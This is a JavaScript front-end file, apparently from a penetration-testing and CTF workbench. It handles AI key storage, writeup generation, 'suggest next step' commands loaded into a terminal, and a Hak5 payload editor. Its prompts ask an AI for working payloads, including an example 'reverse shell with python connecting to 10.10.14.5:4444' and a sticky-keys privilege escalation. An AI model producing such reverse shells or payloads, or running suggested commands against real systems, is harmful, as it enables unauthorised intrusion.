            if (window.DataService && DataService.available) {
                fetch('/api/credentials/secrets/ai_key').then(r => {
                    if (r.ok) {
                        // Key exists on server — clear from localStorage
                        localStorage.removeItem('vulnforge_ai_key');
                    } else {
                        // Try localStorage migration
                        const localKey = localStorage.getItem('vulnforge_ai_key');
                        if (localKey) {
                            // Migrate to backend
                            fetch('/api/credentials/secrets', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ key: 'ai_key', value: localKey, description: 'AI API key' })
                            }).then(() => localStorage.removeItem('vulnforge_ai_key')).catch(() => {});
                        }
                    }
                }).catch(() => {});
                // Similar for suggest key
                fetch('/api/credentials/secrets/suggest_key').then(r => {
                    if (r.ok) localStorage.removeItem('vulnforge_suggest_key');
                }).catch(() => {});
                // Similar for payload studio creds
                fetch('/api/credentials/secrets/ps_creds').then(r => {
                    if (r.ok) localStorage.removeItem('vulnforge_ps_creds');
                }).catch(() => {});
            }

            // Load UI preferences from localStorage (non-secret)
            const ep = localStorage.getItem('vulnforge_ai_endpoint');
            const model = localStorage.getItem('vulnforge_ai_model');
            if (ep) document.getElementById('ai-endpoint').value = ep;
            if (model) document.getElementById('ai-model').value = model;
            // Key: only from localStorage if backend is unavailable
            const key = localStorage.getItem('vulnforge_ai_key');
            if (key && !document.getElementById('ai-key').value) {
                document.getElementById('ai-key').value = key;
            }

            // Also load suggest config
            const sp = localStorage.getItem('vulnforge_suggest_provider');
            const sm = localStorage.getItem('vulnforge_suggest_model');
            if (sp) document.getElementById('suggest-provider').value = sp;
            if (sm) document.getElementById('suggest-model').value = sm;
            const sk = localStorage.getItem('vulnforge_suggest_key');
            if (sk && !document.getElementById('suggest-key').value) {
                document.getElementById('suggest-key').value = sk;
            }
            // Apply local provider key field state on load
            if (sp === 'local') {
                const keyEl = document.getElementById('suggest-key');
                if (keyEl) { keyEl.disabled = true; keyEl.value = ''; keyEl.placeholder = 'No needed for local AI'; }
            }
        } catch {}
    }

    function saveAIConfig() {
        try {
            // Save UI preferences to localStorage (non-secret)
            localStorage.setItem('vulnforge_ai_endpoint', document.getElementById('ai-endpoint').value);
            localStorage.setItem('vulnforge_ai_model', document.getElementById('ai-model').value);
            localStorage.setItem('vulnforge_suggest_provider', document.getElementById('suggest-provider').value);
            localStorage.setItem('vulnforge_suggest_model', document.getElementById('suggest-model').value);

            // Save secrets to backend (NOT localStorage)
            const aiKey = document.getElementById('ai-key').value.trim();
            if (aiKey && window.DataService && DataService.available) {
                fetch('/api/credentials/secrets', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: 'ai_key', value: aiKey, description: 'AI API key' })
                }).then(r => {
                    if (r.ok) localStorage.removeItem('vulnforge_ai_key');
                }).catch(() => {
                    // Fallback: keep in localStorage
                    localStorage.setItem('vulnforge_ai_key', aiKey);
                });
            }

            const suggestKey = document.getElementById('suggest-key').value.trim();
            if (suggestKey && window.DataService && DataService.available) {
                fetch('/api/credentials/secrets', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: 'suggest_key', value: suggestKey, description: 'AI Suggest key' })
                }).then(r => {
                    if (r.ok) localStorage.removeItem('vulnforge_suggest_key');
                }).catch(() => {
                    localStorage.setItem('vulnforge_suggest_key', suggestKey);
                });
            }

            // Handle Payload Studio credentials
            const psEmail = document.getElementById('ps-email')?.value?.trim();
            const psPass = document.getElementById('ps-pass')?.value?.trim();
            if (psEmail && psPass && window.DataService && DataService.available) {
                fetch('/api/credentials/secrets', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: 'ps_creds', value: JSON.stringify({ email: psEmail, password: psPass }), description: 'Payload Studio credentials' })
                }).then(r => {
                    if (r.ok) localStorage.removeItem('vulnforge_ps_creds');
                }).catch(() => {
                    localStorage.setItem('vulnforge_ps_creds', JSON.stringify({ email: psEmail, password: psPass }));
                });
            }
        } catch {}
    }

    window.generateAIWriteup = async function () {
        const endpoint = document.getElementById('ai-endpoint').value.trim();
        const apiKey   = document.getElementById('ai-key').value.trim();
        const model    = document.getElementById('ai-model').value.trim() || 'gpt-4';
        const machine  = document.getElementById('ai-machine').value.trim();
        const findings = document.getElementById('ai-findings').value.trim();
        const steps    = document.getElementById('ai-steps').value.trim();
        const flags    = document.getElementById('ai-flags').value.trim();

        if (!apiKey) { alert('⚠️  Enter your API key in the configuration section'); return; }
        if (!machine) { alert('⚠️  Enter the machine/target name'); return; }
        if (!findings) { alert('⚠️  Enter at least some findings'); return; }

        saveAIConfig();

        const status = document.getElementById('ai-status');
        const output = document.getElementById('ai-output');
        const btnGen = document.querySelector('#tab-aiwriteup .bg-neon\\/10');
        status.classList.remove('hidden');
        status.innerHTML = '⏳ Generating writeup... <span class="ai-status-dot ml-1"></span>';
        output.textContent = 'Generating...';
        if (btnGen) btnGen.disabled = true;

        const prompt = `You are a professional penetration tester writing a CTF machine writeup. Write a detailed, well-structured writeup in Markdown format.

Machine: ${machine}
${flags ? `Flags: ${flags}` : ''}

## Key Findings
${findings}

## Steps Taken
${steps || 'See findings above'}

Generate a complete writeup with:
1. **Reconnaissance** - Nmap, Gobuster, etc. findings
2. **Enumeration** - Detailed analysis of services found
3. **Exploitation** - Step-by-step with commands and explanations
4. **Privilege Escalation** - How root/admin was obtained
5. **Flags** - user.txt and root.txt
6. **Lessons Learned** - Key takeaways

Use markdown formatting with code blocks for commands. Be thorough and technical.`;

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: model,
                    messages: [
                        { role: 'system', content: 'You are a professional CTF writeup author. Write detailed, technical Markdown writeups.' },
                        { role: 'user', content: prompt }
                    ],
                    temperature: 0.7,
                    max_tokens: 4000
                })
            });

            if (!response.ok) {
                const errText = await response.text();
                throw new Error(`API error ${response.status}: ${errText}`);
            }

            const data = await response.json();
            let content = '';
            if (data.choices && data.choices[0] && data.choices[0].message) {
                content = data.choices[0].message.content;
            } else if (data.response) {
                content = data.response;
            } else {
                content = JSON.stringify(data, null, 2);
            }

            lastAIWriteup = content;
            output.textContent = content;
            document.getElementById('btn-download-ai').disabled = false;
            showToast('🤖 Writeup generated successfully');
            // Save to DB
            _saveReportToDB({
                type: 'ai_writeup',
                title: `Writeup — ${machine}`,
                target: machine,
                raw_output: content,
                format: 'md'
            });
        } catch (err) {
            output.textContent = `[!] Error: ${err.message}`;
            showToast(`⚠️ AI generation failed: ${err.message}`);
        } finally {
            status.classList.add('hidden');
            if (btnGen) btnGen.disabled = false;
        }
    };

    // ============================================================
    //  AI SUGGEST NEXT STEP (Fase 2)
    // ============================================================

    let suggestionHistory = [];

    window.loadAIConfigToSuggest = function () {
        const ep = document.getElementById('ai-endpoint').value;
        const key = document.getElementById('ai-key').value;
        const model = document.getElementById('ai-model').value;
        // Detect provider from endpoint URL
        let provider = 'openai';
        if (ep.includes('gemini') || ep.includes('generativelanguage')) provider = 'gemini';
        else if (ep.includes('anthropic') || ep.includes('claude')) provider = 'anthropic';
        else if (ep.includes('openrouter')) provider = 'openrouter';
        else if (ep.includes('deepseek')) provider = 'deepseek';
        else if (ep.includes('groq')) provider = 'groq';
        else if (ep.includes('localhost:11434') || ep.includes('localhost:1234') || ep.includes('127.0.0.1:11434') || ep.includes('127.0.0.1:1234')) provider = 'local';
        document.getElementById('suggest-provider').value = provider;
        document.getElementById('suggest-key').value = key;
        // Set a sensible default model if none saved
        const defaults = {
            openai: 'gpt-4o-mini', gemini: 'gemini-2.0-flash',
            anthropic: 'claude-3-haiku-20240307', openrouter: 'gpt-4o-mini',
            deepseek: 'deepseek-chat', groq: 'llama-3.3-70b-versatile',
            local: 'llama3'
        };
        document.getElementById('suggest-model').value = model || defaults[provider] || 'gpt-4o-mini';
        showToast('📋 Config loaded from AI Writeup');
    };

    window.collectFindingsText = function () {
        // Collect findings from the reports data structure
        // Each report has: type, title, target, raw_output, parsed_data
        const reports = window.reports || [];
        if (reports.length === 0) {
            // Fallback: try to get from the DOM
            const cards = document.querySelectorAll('#findings-list .finding-card');
            return Array.from(cards).map(c => c.textContent.trim()).filter(Boolean).join('\n---\n');
        }
        return reports.map(r => {
            const lines = [`[${r.type.toUpperCase()}] ${r.title || ''}`];
            if (r.target) lines.push(`  Target: ${r.target}`);
            // Parse raw_output for key lines
            if (r.raw_output) {
                const keyLines = r.raw_output.split('\n').filter(l => {
                    const t = l.trim();
                    return t && (t.includes('open') || t.includes('found') || t.includes('Status:') ||
                           t.includes('->') || t.includes('flag') || t.includes('user:') ||
                           t.includes('root:') || t.toLowerCase().includes('vulnerable'));
                }).slice(0, 10).map(l => `  ${l.trim()}`);
                if (keyLines.length) lines.push(...keyLines);
            }
            if (r.parsed_data && Object.keys(r.parsed_data).length) {
                try { lines.push(`  Data: ${JSON.stringify(r.parsed_data).slice(0, 200)}`); } catch {}
            }
            return lines.join('\n');
        }).join('\n---\n');
    };

    // ── Extract command from AI suggestion ──
    window.extractCommandFromSuggestion = function (text) {
        if (!text) return '';
        // Priority 1: text in backticks that looks like a shell command
        const backtickCmds = text.match(/`([^`]+)`/g);
        if (backtickCmds) {
            // Prefer first backtick cmd that looks shell-ish (has spaces, starts with tool name)
            for (const m of backtickCmds) {
                const cmd = m.slice(1, -1).trim();
                if (/^[a-z][\w-]+\s/.test(cmd) && cmd.length < 200) return cmd;
            }
            // Fallback: first backtick item
            const first = backtickCmds[0].slice(1, -1).trim();
            if (first && first.length < 200) return first;
        }
        // Priority 2: lines starting with "Run " or "Use " or "$ " or "# "
        for (const line of text.split('\n')) {
            const trimmed = line.trim();
            // "Run `command`" -> extract the backtick part
            const runMatch = trimmed.match(/^Run\s+`([^`]+)`/i);
            if (runMatch) return runMatch[1].trim();
            // "$ command" or "# command"
            const shellMatch = trimmed.match(/^[$#]\s+(.+)/);
            if (shellMatch) return shellMatch[1].trim();
            // "Use `command`"
            const useMatch = trimmed.match(/^Use\s+`([^`]+)`/i);
            if (useMatch) return useMatch[1].trim();
        }
        // Priority 3: first line, stripped of markdown bold/italic
        const firstLine = text.split('\n')[0].replace(/[*_`#]/g, '').trim();
        if (firstLine && firstLine.length < 100) return firstLine;
        return '';
    };

    // ════════════════════════════════════════════════════════════════
    //  GENERIC AI CHAT — reusable across all sections
    // ════════════════════════════════════════════════════════════════

    function _getAIConfig() {
        return {
            provider: document.getElementById('suggest-provider')?.value || 'groq',
            apiKey: (document.getElementById('suggest-key')?.value || '').trim(),
            model: (document.getElementById('suggest-model')?.value || '').trim()
        };
    }

    window.aiChat = async function (systemPrompt, userMessage) {
        const cfg = _getAIConfig();
        if (!cfg.apiKey && cfg.provider !== 'local') {
            showToast('⚠️ Configure an API key in Findings → AI Settings first');
            return null;
        }
        try {
            const resp = await fetch('/api/ai/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    provider: cfg.provider,
                    api_key: cfg.apiKey,
                    model: cfg.model,
                    messages: [
                        { role: 'system', content: systemPrompt },
                        { role: 'user', content: userMessage }
                    ]
                })
            });
            const data = await resp.json();
            if (!data.ok) throw new Error(data.error || 'AI request failed');
            return data.content;
        } catch (err) {
            showToast(`⚠️ AI: ${err.message}`);
            return null;
        }
    };

    // ── Scripts: generate script from description ──
    window.aiGenerateScript = async function () {
        const desc = prompt('Describe the script you want to generate (e.g. "reverse shell with python connecting to 10.10.14.5:4444"):');
        if (!desc) return;
        const editor = document.getElementById('script-editor');
        const lang = document.getElementById('script-lang')?.textContent || 'bash';
        const prompt = `Generate a ${lang} script for the following purpose. Return ONLY the raw script code, no explanation, no markdown formatting.\n\nPurpose: ${desc}`;
        const result = await aiChat('You are an offensive scripting expert. Generate clean, working payload scripts.', prompt);
        if (result) {
            editor.value = result.replace(/```\w*\n?/g, '');
            showToast('🤖 Script generated!');
            updateScriptLineCount();
        }
    };

    // ── Bounty: enhance report with AI ──
    window.aiEnhanceBounty = async function () {
        const target = document.getElementById('bounty-target')?.value;
        const vuln = document.getElementById('bounty-type')?.value;
        const severity = document.getElementById('bounty-severity')?.value;
        const component = document.getElementById('bounty-component')?.value;
        const desc = document.getElementById('bounty-description')?.value;
        const steps = document.getElementById('bounty-steps')?.value;
        const impact = document.getElementById('bounty-impact')?.value;
        const fix = document.getElementById('bounty-fix')?.value;
        if (!target || !vuln) {
            showToast('⚠️ Fill at least Target and Vulnerability type first');
            return;
        }
        const context = `Target: ${target}\nVulnerability: ${vuln} (${severity})\nComponent: ${component || 'N/A'}\nDescription: ${desc || 'N/A'}\nSteps: ${steps || 'N/A'}\nImpact: ${impact || 'N/A'}\nFix: ${fix || 'N/A'}`;
        const result = await aiChat(
            'You are a professional bug bounty hunter. Generate a polished, detailed bug bounty report in markdown. Include: title, target, vulnerability type, severity, description, steps to reproduce, impact, and remediation. Be precise and professional.',
            context
        );
        if (result) {
            const output = document.getElementById('bounty-preview');
            if (output) output.textContent = result;
            document.getElementById('btn-download-bounty')?.removeAttribute('disabled');
            showToast('🤖 Bounty report enhanced!');
        }
    };

    // ── Hak5: generate payload from description ──
    window.aiGeneratePayload = async function () {
        const deviceBtn = document.querySelector('.hak5-device-btn.active');
        const device = deviceBtn?.dataset?.device || 'bunny';
        const desc = prompt(`Describe the ${device} payload you want (e.g. "privesc via sticky keys"):`);
        if (!desc) return;
        const editor = document.getElementById('hak5-editor');
        const prompt = `Generate a Hak5 ${device} payload for: ${desc}\n\nReturn ONLY the raw payload code, no explanation.`;
        const result = await aiChat(`You are a Hak5 payload expert. Generate working payloads for ${device} devices. Use proper syntax for the device.`, prompt);
        if (result) {
            editor.value = result.replace(/```\w*\n?/g, '');
            showToast(`🤖 ${device} payload generated!`);
            updateHak5LineCount();
        }
    };

    // ── Automation: generate n8n workflow description ──
    window.aiGenerateWorkflow = async function () {
        const desc = prompt('Describe the n8n workflow you want to create (e.g. "automated port scan that emails results"):');
        if (!desc) return;
        const result = await aiChat(
            'You are an n8n workflow expert. Describe in detail how to build the requested workflow step by step in n8n. Include: trigger type, nodes needed, how to configure each node, and expected output.',
            `Design an n8n workflow for: ${desc}`
        );
        if (result) {
            const log = document.getElementById('n8n-log') || document.querySelector('#tab-automation .overflow-y-auto pre');
            if (log) log.textContent = result;
            showToast('🤖 Workflow description generated!');
        }
    };

    window.suggestNextStep = async function () {
        const provider = document.getElementById('suggest-provider').value;
        const apiKey = document.getElementById('suggest-key').value.trim();
        const modelEl = document.getElementById('suggest-model');
        let model = modelEl.value.trim();
        // Validate model — if it looks like a provider name, fix it
        const providerNames = ['openai','gemini','anthropic','openrouter','deepseek','groq','local'];
        if (!model || providerNames.includes(model.toLowerCase())) {
            model = MODEL_DEFAULTS[provider] || 'gpt-4o-mini';
            if (modelEl) modelEl.value = model;
        }
        const target = document.getElementById('target-ip').value.trim() || 'unknown';
        const findings = collectFindingsText();
        const btn = document.getElementById('btn-suggest');
        const status = document.getElementById('suggest-status');
        const section = document.getElementById('suggestions-section');
        const list = document.getElementById('suggestions-list');

        if (!apiKey && provider !== 'local') {
            showToast('⚠️ Enter an API key or load from AI Writeup config');
            return;
        }

        btn.disabled = true;
        btn.textContent = `⏳ ${provider}...`;
        status.textContent = `⏳ Consulting ${provider} (${model || 'default model'})...`;
        status.classList.remove('hidden');

        try {
            const resp = await fetch('/api/suggest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    provider,
                    api_key: apiKey,
                    model: model || '',
                    target,
                    findings: findings || 'No findings yet. Suggest initial recon.',
                    history: suggestionHistory.slice(-6) // last 6 exchanges for context
                })
            });

            const data = await resp.json();
            if (!data.ok) throw new Error(data.error || 'Unknown error');

            const suggestion = data.suggestion;

            // Add to history
            suggestionHistory.push({ role: 'assistant', content: suggestion });

            // Add to DOM
            section.classList.remove('hidden');
            const card = document.createElement('div');
            card.className = 'bg-void border border-cyber/20 rounded p-2.5 text-[11px]';
            card.innerHTML = `
                <div class="flex items-center gap-1.5 mb-1.5">
                    <span class="text-[9px] text-cyber/60 font-mono">${new Date().toLocaleTimeString()}</span>
                    <span class="text-[9px] text-gray-700">·</span>
                    <span class="text-[9px] text-gray-700 uppercase">${provider}</span>
                </div>
                <div class="text-gray-300 leading-relaxed text-[11px] suggestion-body">${mdToHTML(suggestion)}</div>
                <div class="flex gap-2 mt-1.5">
                    <button data-cmd="${extractCommandFromSuggestion(suggestion).replace(/"/g, '&quot;')}"
                        class="suggest-run-cmd text-[9px] text-neon/60 hover:text-neon transition-all">▶ Run first command</button>
                    <button data-action="copy-clipboard"
                        class="text-[9px] text-gray-600 hover:text-gray-400 transition-all">📋 Copy</button>
                </div>
            `;
            list.appendChild(card);
            list.scrollTop = list.scrollHeight;

            // Auto-load first suggested command into terminal & switch there
            const firstCmd = extractCommandFromSuggestion(suggestion);
            const input = document.getElementById('cmd-input');
            if (input && firstCmd) {
                input.value = firstCmd;
                switchTab('terminal');
                input.focus();
                showToast('▶ Command loaded — press Enter to run in Terminal');
            } else {
                switchTab('findings');
                showToast('🤖 Suggestion received — check Findings tab');
            }
        } catch (err) {
            showToast(`⚠️ ${err.message}`);
            const card = document.createElement('div');
            card.className = 'bg-void border border-blood/20 rounded p-2.5 text-[11px] text-blood';
            card.textContent = `[!] ${err.message}`;
            list.appendChild(card);
        } finally {
            btn.disabled = false;
            btn.textContent = '🔍 Sugerir siguiente paso';
            status.classList.add('hidden');
        }
    };

    window.clearSuggestions = function () {
        suggestionHistory = [];
        document.getElementById('suggestions-list').innerHTML = '';
        document.getElementById('suggestions-section').classList.add('hidden');
    };

    // Delegated click handler for "Run first command" buttons in suggestions
    document.addEventListener('click', function (e) {
        const btn = e.target.closest('.suggest-run-cmd');
        if (btn) {
            const cmd = btn.getAttribute('data-cmd') || '';
            const input = document.getElementById('cmd-input');
            if (input && cmd) {
                input.value = cmd;
                input.focus();
                showToast('📋 Command loaded in terminal: ' + cmd.slice(0, 60));
            }
        }
    });

    window.copyToClipboard = function (btn) {
        const text = btn.closest('.bg-void')?.querySelector('.text-gray-300')?.textContent || '';
        if (text && navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('📋 Copied to clipboard');
            }).catch(() => {});
        }
    };

    // ============================================================
    //  HAK5 PAYLOAD EDITOR
    // ============================================================
    const hak5Devices = {
        bunny:  { name: 'Bash Bunny',      icon: '🐰', ext: 'txt', lang: 'ducky script', desc: 'USB Rubber Ducky-style HID attacks' },
        omg:    { name: 'OMG Cable',       icon: '🔌', ext: 'js',  lang: 'javascript',    desc: 'WiFi-enabled drop cable payloads' },
        m5:     { name: 'M5 Stack',        icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
        shack:  { name: 'Shack Jack',      icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' }
    };
    let currentHak5Device = 'bunny';

    function getHak5StorageKey() {
        return `vulnforge_hak5_${currentHak5Device}`;
    }

    function getHak5Payloads() {
        try {
            return JSON.parse(localStorage.getItem(getHak5StorageKey()) || '[]');
        } catch { return []; }
    }

    function setHak5Payloads(arr) {
        localStorage.setItem(getHak5StorageKey(), JSON.stringify(arr));
        updateHak5SavedCount();
        // Sync to DB in background
        if (window.DataService && DataService.available) {
            arr.forEach(p => {
                if (!p._dbSynced) {
                    DataService.savePayload({
                        device: currentHak5Device,
                        name: p.name,
                        content: p.code
                    }).then(r => {
                        if (r) p._dbSynced = true;
                    }).catch(() => {});
                }
            });
        }
    }

    function updateHak5SavedCount() {
        const count = getHak5Payloads().length;
        document.getElementById('hak5-saved-count').textContent = count;
    }

    window.switchHak5Device = function (deviceId) {
        currentHak5Device = deviceId;
        const dev = hak5Devices[deviceId];
        if (!dev) return;

        // Update tabs
        document.querySelectorAll('.hak5-device-btn').forEach(b => b.classList.remove('active'));
        document.querySelector(`.hak5-device-btn[data-device="${deviceId}"]`)?.classList.add('active');

        // Update UI
        document.getElementById('hak5-device-name').textContent = dev.name;
        document.getElementById('hak5-device-icon').textContent = dev.icon;
        document.getElementById('hak5-device-desc').textContent = dev.desc;
        document.getElementById('hak5-lang').textContent = dev.lang;
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '';
        updateHak5SavedCount();
        showToast(`🔌 Switched to ${dev.name}`);
    };

    window.saveHak5Payload = function () {
        const dev = hak5Devices[currentHak5Device];
        const name = document.getElementById('hak5-payload-name').value.trim();
        const code = document.getElementById('hak5-editor').value.trim();
        if (!name) { showToast('⚠️ Enter a payload name'); return; }
        if (!code) { showToast('⚠️ Enter payload code'); return; }

        const payloads = getHak5Payloads();
        const filename = name.endsWith(`.${dev.ext}`) ? name : `${name}.${dev.ext}`;

        // Update if exists, else add
        const idx = payloads.findIndex(p => p.name === filename);
        if (idx >= 0) {
            payloads[idx].code = code;
            payloads[idx].updated = new Date().toISOString();
            showToast(`💾 Updated "${filename}"`);
        } else {
            payloads.push({ name: filename, code, device: currentHak5Device, created: new Date().toISOString(), updated: new Date().toISOString() });
            showToast(`💾 Saved "${filename}"`);
        }
        setHak5Payloads(payloads);
    };

    window.loadHak5Payload = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) { showToast('📂 No saved payloads'); return; }

        // Build a simple select prompt
        const names = payloads.map((p, i) => `${i+1}. ${p.name}`).join('\n');
        const input = prompt(`Saved payloads for ${hak5Devices[currentHak5Device].name}:\n\n${names}\n\nEnter number to load:`);
        if (!input) return;
        const idx = parseInt(input) - 1;
        if (idx < 0 || idx >= payloads.length) { showToast('⚠️ Invalid selection'); return; }

        document.getElementById('hak5-editor').value = payloads[idx].code;
        document.getElementById('hak5-payload-name').value = payloads[idx].name;
        document.getElementById('hak5-payload-status').textContent = `📂 loaded "${payloads[idx].name}"`;
        showToast(`📂 Loaded "${payloads[idx].name}"`);
    };

    window.listHak5Payloads = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) {
            showToast('📋 No saved payloads for this device');
            return;
        }
        // Show in terminal-like output in status
        const list = payloads.map((p, i) => `${i+1}. ${p.name}`).join(' · ');
        document.getElementById('hak5-payload-status').textContent = `📋 ${payloads.length} payloads: ${list}`;
        showToast(`📋 ${payloads.length} payloads for ${hak5Devices[currentHak5Device].name}`);
    };

    window.clearHak5Editor = function () {
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '✕ cleared';
        showToast('✕ Editor cleared');
    };

    // Update line count on edit (deferred until DOM ready)
    const initHak5 = () => {
        const hak5Editor = document.getElementById('hak5-editor');
        if (hak5Editor) {
            hak5Editor.addEventListener('input', () => {
                document.getElementById('hak5-line-count').textContent = getLineCount(hak5Editor.value);
            });
        }
        // Try to load payloads from DB
        if (window.DataService && DataService.available) {
            DataService.listPayloads(currentHak5Device).then(list => {
                if (list && list.length > 0) {
                    const mapped = list.map(p => ({
                        name: p.name,
                        code: p.content,
                        device: p.device,
                        _dbSynced: true,
                        created: p.created_at
                    }));
                    localStorage.setItem(getHak5StorageKey(), JSON.stringify(mapped));
                }
                updateHak5SavedCount();
            }).catch(() => updateHak5SavedCount());
        } else {
            updateHak5SavedCount();
        }
    };
    // Run now (DOM is already loaded at this point since we're inside DOMContentLoaded)
    initHak5();

    // ============================================================
    //  PAYLOAD STUDIO CONNECTION
    // ============================================================
    function getPSCreds() {
        // Try backend first, fall back to localStorage
        if (window.DataService && DataService.available) {
            // Async — return localStorage sync for now, background fetch will update UI
            this._psFetching = true;
            fetch('/api/credentials/secrets/ps_creds').then(r => {
                if (r.ok) {
                    // Exists on server — migrate away from localStorage
                    localStorage.removeItem('vulnforge_ps_creds');
                    this._psFetching = false;
                }
            }).catch(() => { this._psFetching = false; });
        }
        try { return JSON.parse(localStorage.getItem('vulnforge_ps_creds') || 'null'); } catch { return null; }
    }

    function setPSCreds(creds) {
        localStorage.setItem('vulnforge_ps_creds', JSON.stringify(creds));
        // Save to backend in background
        if (window.DataService && DataService.available) {
            fetch('/api/credentials/secrets', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: 'ps_creds', value: JSON.stringify(creds), description: 'Payload Studio credentials' })
            }).then(r => {
                if (r.ok) localStorage.removeItem('vulnforge_ps_creds');
            }).catch(() => {});
        }
    }

    function clearPSCreds() {
        localStorage.removeItem('vulnforge_ps_creds');
        // Delete from backend
        if (window.DataService && DataService.available) {
            fetch('/api/credentials/secrets/ps_creds', { method: 'DELETE' }).catch(() => {});
        }
    }

    function updatePSStatus(connected) {
        const badge = document.getElementById('ps-status-badge');
        const form  = document.getElementById('ps-connect-form');
        const btnDisconnect = document.getElementById('btn-disconnect-ps');
        if (!badge) return;

        if (connected) {
            badge.innerHTML = '🟢 connected';
            badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-0.5';
            if (form) form.style.display = 'none';
            if (btnDisconnect) btnDisconnect.style.display = 'inline-block';
        } else {
            badge.innerHTML = '⚪ disconnected';
            badge.className = 'text-[9px] text-gray-700 border border-gray-800 rounded px-2 py-0.5';
            if (btnDisconnect) btnDisconnect.style.display = 'none';
        }
    }

    window.togglePSCreds = function () {
        const form = document.getElementById('ps-connect-form');
        if (!form) return;
        const hidden = form.style.display === 'none';
        form.style.display = hidden ? 'block' : 'none';
        // Pre-fill if saved
        if (hidden) {
            const saved = getPSCreds();
            if (saved) {
                document.getElementById('ps-email').value = saved.email || '';
                document.getElementById('ps-password').value = saved.password || '';
            }
        }
    };

    window.disconnectPayloadStudio = function () {
        clearPSCreds();
        updatePSStatus(false);
        document.getElementById('ps-email').value = '';
        document.getElementById('ps-password').value = '';
        document.getElementById('ps-connect-form').style.display = 'none';
        showToast('⚡ Credentials cleared');
    };

    window.doPayloadStudioLogin = function () {
        const email = document.getElementById('ps-email').value.trim();
        const password = document.getElementById('ps-password').value.trim();
        if (!email || !password) {
            showToast('⚠️ Enter email and password');
            return;
        }
        setPSCreds({ email, password, savedAt: new Date().toISOString() });
        updatePSStatus(true);
        document.getElementById('ps-connect-form').style.display = 'none';
        showToast('🔌 Credentials saved — click Launch Payload Studio to open');
    };

    // Restore saved session on load
    function restorePSSession() {
        const saved = getPSCreds();
        if (saved) {
            document.getElementById('ps-email').value = saved.email || '';
            document.getElementById('ps-password').value = saved.password || '';
            updatePSStatus(true);
        }
    }
    restorePSSession();

    // ── Auto-save Suggest + AI config on input change ──
    const MODEL_DEFAULTS = {
        openai: 'gpt-4o-mini', gemini: 'gemini-2.0-flash',
        anthropic: 'claude-3-haiku-20240307', openrouter: 'gpt-4o-mini',
        deepseek: 'deepseek-chat', groq: 'llama-3.3-70b-versatile',
        local: 'llama3'
    };

    function initAutosave() {
        ['suggest-provider','suggest-key','suggest-model','ai-endpoint','ai-key','ai-model'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.addEventListener('blur', saveAIConfig);
        });
        // Auto-fill model when provider changes (always)
        const provEl = document.getElementById('suggest-provider');
        if (provEl) {
            provEl.addEventListener('change', function () {
                const modelEl = document.getElementById('suggest-model');
                if (modelEl) modelEl.value = MODEL_DEFAULTS[this.value] || 'gpt-4o-mini';
                // Handle API key field for local provider (no key needed)
                const keyEl = document.getElementById('suggest-key');
                if (keyEl) {
                    if (this.value === 'local') {
                        keyEl.disabled = true;
                        keyEl.value = '';
                        keyEl.placeholder = 'No needed for local AI';
                    } else {
                        keyEl.disabled = false;
                        keyEl.placeholder = 'API Key';
                    }
                }
                saveAIConfig();
            });
        }
    }
    initAutosave();

    // ============================================================
    //  N8N AUTOMATION
    // ============================================================

    // ── Load saved n8n URL ──
    function loadN8nUrl() {
        const saved = localStorage.getItem('vulnforge_n8n_url');
        const input = document.getElementById('n8n-url');
        if (saved && input) {
            input.value = saved;
        }
    }

    function saveN8nUrl() {
        const input = document.getElementById('n8n-url');
        if (input && input.value.trim()) {
            localStorage.setItem('vulnforge_n8n_url', input.value.trim());
        }
    }

    window.checkN8nStatus = async function () {
        const input = document.getElementById('n8n-url');
        const badge = document.getElementById('n8n-status-badge');
        const btn   = document.getElementById('btn-n8n-health');
        if (!input || !badge) return;

        const url = input.value.trim();
        if (!url) {
            badge.innerHTML = '⚠️ enter URL';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            return;
        }

        saveN8nUrl();
        btn.textContent = '⏳ Testing...';
        btn.disabled = true;
        badge.innerHTML = '⏳ testing...';
        badge.className = 'text-[9px] text-cyber border border-cyber/30 rounded px-2 py-1';

        try {
            const resp = await fetch((window.API_URL || '') + `/api/n8n/status?n8n_url=${encodeURIComponent(url)}`);
            const data = await resp.json();
            if (data.reachable) {
                badge.innerHTML = '🟢 reachable';
                badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-1';
                showToast('✅ n8n server is reachable');
            } else {
                badge.innerHTML = '🔴 unreachable';
                badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
                showToast('❌ n8n server is not responding');
            }
        } catch (err) {
            badge.innerHTML = '⚠️ error';
            badge.className = 'text-[9px] text-blood border border-blood/30 rounded px-2 py-1';
            showToast(`⚠️ Connection test failed: ${err.message}`);
        } finally {
            btn.textContent = '🔍 Test';
            btn.disabled = false;
        }
    };

    window.triggerN8nScan = async function () {
        const urlInput   = document.getElementById('n8n-url');
        const targetInput = document.getElementById('n8n-target');
        const scanSelect = document.getElementById('n8n-scan-type');
        const btn        = document.getElementById('btn-n8n-trigger');
        const statusSpan = document.getElementById('n8n-scan-status');
        const logDiv     = document.getElementById('n8n-log');

        if (!urlInput || !targetInput || !scanSelect || !logDiv) return;

